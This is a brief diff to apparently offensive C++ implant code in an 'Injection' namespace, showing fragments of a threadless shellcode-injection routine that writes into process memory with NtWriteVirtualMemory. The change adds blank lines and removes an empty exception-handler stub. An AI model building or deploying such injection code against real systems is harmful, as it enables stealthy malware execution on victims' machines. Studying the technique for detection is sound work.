@@ -3,6 +3,8 @@
 #define EXPORT_OFFSET 0x12
 
 namespace Injection {
+
+
     VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
         HEXANE
 
@@ -139,10 +141,5 @@ namespace Injection {
             return Ctx->Nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
         }
 
-        LONG WINAPI Debugger(EXCEPTION_POINTERS *execption) {
-            HEXANE
-
-            return EXCEPTION_CONTINUE_EXECUTION;
-        }
     }
 }
